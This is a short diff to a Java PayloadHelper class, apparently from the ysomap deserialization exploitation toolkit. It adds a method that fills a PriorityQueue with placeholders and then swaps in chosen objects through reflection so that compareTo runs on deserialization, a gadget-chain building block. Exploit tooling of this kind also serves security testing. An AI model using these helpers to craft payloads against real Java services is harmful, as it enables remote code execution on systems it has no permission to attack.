@@ -127,6 +127,20 @@ public class PayloadHelper {
         return set;
     }
 
+    // triger compareTo function
+    public static Object makePriorityQueue(Object a, Object b) throws Exception {
+        // create queue with numbers and basic comparator
+        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2);
+        // stub data for replacement later
+        queue.add("1");
+        queue.add("1");
+        // switch contents of queue
+        final Object[] queueArray = (Object[]) ReflectionHelper.getFieldValue(queue, "queue");
+        queueArray[0] = a;
+        queueArray[1] = b;
+        return queue;
+    }
+
     public static Object makeTreeSetWithXString(Object obj) throws Exception {
         Object rdnEntry1 = ReflectionHelper.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
         ReflectionHelper.setFieldValue(rdnEntry1, "type", "ysomap");
